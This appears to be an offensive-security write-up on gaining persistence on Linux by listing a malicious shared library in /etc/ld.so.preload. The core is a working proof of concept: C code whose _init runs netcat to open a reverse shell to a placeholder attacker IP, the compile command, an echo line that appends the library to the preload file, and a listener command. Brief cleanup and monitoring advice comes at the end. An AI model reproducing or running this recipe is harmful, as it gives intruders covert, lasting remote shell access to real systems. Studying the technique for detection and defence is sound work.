# Library Injection via ld.so.preload File 
A technique that uses /etc/ld.so.preload to inject custom libraries for code execution and persistence
### Description
This technique exploits the /etc/ld.so.preload file on Linux systems to achieve system-wide persistence by injecting a shared library that loads with every dynamically linked process. By adding a custom library path to /etc/ld.so.preload, attackers can execute arbitrary code whenever any new process is started. This technique leverages the dynamic linker (ld.so) to preload a specified library before standard libraries, making it effective for both privilege escalation and stealth operations.

When an application starts, the dynamic linker checks /etc/ld.so.preload and loads any libraries listed there, enabling custom code to run with the privileges of the calling process. Because /etc/ld.so.preload applies system-wide and requires root permissions to modify, it is often used by attackers with escalated privileges to maintain control over a compromised system. This can be leveraged to execute logging, monitoring, or malicious activities silently across reboots and user sessions.

## Detailed PoC (Proof of Concept)
Let's walk through the detailed steps of exploiting this technique. I'll break it down into phases: preparation, library creation, injection into /etc/ld.so.preload, and execution.

### Step 1: Understanding the Exploit
Objective: Gain persistence on a Linux system by injecting a malicious shared library through the /etc/ld.so.preload mechanism.
Mechanism: The dynamic linker (ld.so) checks the /etc/ld.so.preload file on system startup and loads any libraries listed there before loading the standard libraries. If an attacker can modify this file, they can insert a malicious library that runs arbitrary code when any process starts.
Step 2: Creating a Malicious Shared Library
First, you need to create a custom shared library that will be injected when a process starts. This library can contain malicious code, such as a reverse shell, a keylogger, or other persistent malware.

Code for a Malicious Shared Library (example: reverse shell):

c
Copy
Edit
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void _init() {
    // The reverse shell payload: connects to an attacker-controlled IP and port
    const char *ip = "attacker_ip_here";  // Replace with attacker's IP
    const int port = 4444;                // Replace with desired port

    char command[128];
    snprintf(command, sizeof(command), "nc %s %d -e /bin/bash", ip, port);

    // Execute the reverse shell
    system(command);
}
Steps to compile the malicious shared library:

Save the above code into a file called reverse_shell.c.
Compile it into a shared library:
bash
Copy
Edit
gcc -shared -fPIC -o reverse_shell.so reverse_shell.c
This creates the reverse_shell.so shared library, which will execute a reverse shell to the attacker's IP and port when any process is started.

Step 3: Modifying /etc/ld.so.preload
Once the malicious shared library is compiled, the next step is to modify the /etc/ld.so.preload file to ensure that the malicious library is loaded system-wide whenever a process starts.

1. Check if /etc/ld.so.preload exists:

If the file already exists, you'll append your library path to it. If it doesn't exist, you’ll need to create it.

2. Gain root access:

Since modifying /etc/ld.so.preload requires root privileges, you’ll need to escalate privileges to root if not already done. This could be through an existing vulnerability, misconfiguration, or a privilege escalation exploit.

3. Modify /etc/ld.so.preload:

Assuming you've gained root access, you can modify /etc/ld.so.preload by appending the path of the malicious shared library:

bash
Copy
Edit
echo "/path/to/reverse_shell.so" >> /etc/ld.so.preload
Make sure to replace /path/to/reverse_shell.so with the actual path to your malicious shared library.

Step 4: Test the Exploit
At this point, the malicious library is set to be loaded every time any dynamically linked process starts. To test the exploit, simply start a new process. For example, try running:

bash
Copy
Edit
ls
This will run the ls command, but because of the /etc/ld.so.preload file, the reverse shell library will be loaded first, and it will attempt to connect to the attacker's machine.

Step 5: Set up Listener on Attacker's Machine
To receive the reverse shell, you need to set up a listener on the attacker's machine using Netcat (nc). On your attacker's machine:

bash
Copy
Edit
nc -lvp 4444
Make sure that port 4444 (or whatever port you specified) is open and listening for connections.

Step 6: Persistent Execution
Since /etc/ld.so.preload is applied system-wide, this technique will survive reboots and user logins as long as the malicious library remains in the specified path and /etc/ld.so.preload is not modified. This gives the attacker full persistence on the system.

Step 7: Cleanup and Mitigation
To remove the malicious payload, you would simply need to:

Remove the entry from /etc/ld.so.preload:

sed -i '/reverse_shell.so/d' /etc/ld.so.preload
Delete the malicious shared library:

rm /path/to/reverse_shell.so
Restart the system or relaunch processes to ensure the payload is no longer injected.

# Additional Considerations and Mitigation
### Security Measures:

Restrict write access to /etc/ld.so.preload and other critical system files.
Use tools like SELinux, AppArmor, or other mandatory access control (MAC) systems to limit the impact of privilege escalation attacks.
Ensure that only trusted users can modify the system's library paths and execute dynamic binaries.
Regularly audit the /etc/ld.so.preload file to ensure there are no unauthorized entries.
Monitoring:

Set up monitoring for system changes to /etc/ld.so.preload to detect tampering.
Monitor network activity, particularly outgoing connections to detect suspicious reverse shell connections.

